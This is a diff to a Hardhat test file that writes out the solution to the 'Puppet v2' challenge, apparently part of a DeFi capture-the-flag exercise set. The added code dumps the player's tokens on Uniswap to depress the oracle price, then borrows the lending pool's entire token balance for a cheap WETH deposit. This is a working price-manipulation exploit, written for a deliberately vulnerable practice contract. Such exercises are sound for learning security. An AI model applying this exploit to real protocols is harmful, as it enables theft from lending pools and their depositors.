@@ -82,7 +82,35 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+         
+        // Approve uniswap to spend all our DVT tokens
+        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE)
+
+        // Swap all our DVT for ETH, to push down deposit required inside lending pool.
+        await uniswapRouter.connect(player).swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE, // Sending all our DVT
+            ethers.utils.parseEther("9"), // Get at least 9 eth
+            [token.address, weth.address], // address of the tokens
+            player.address, // Receiver
+            (await ethers.provider.getBlock('latest')).timestamp * 2 //deadline    
+        )
+
+        // Calculate deposit required to borrow all tokens from pool.
+        const deposit = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
+        
+        // Deposit all our ETH inside WETH for paying deposit to lending pool and approve lending pool to transfer those funds.
+        await weth.connect(player).deposit({ value: deposit });
+        await weth.connect(player).approve(lendingPool.address, deposit);
+      
+        // Log values
+        // console.log("ETH PLAYER BALANCE:" + await ethers.provider.getBalance(player.address))
+        // console.log("DVT PLAYER BALANCE:" + await token.balanceOf(player.address))
+        // console.log("WETH PLAYER BALANCE:" + await weth.balanceOf(player.address))
+        // console.log("DEPOSIT REQUIRED: " + deposit)
+
+        // Now we should have enough weth for getting all the tokens
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE)
+
     });
 
     after(async function () {
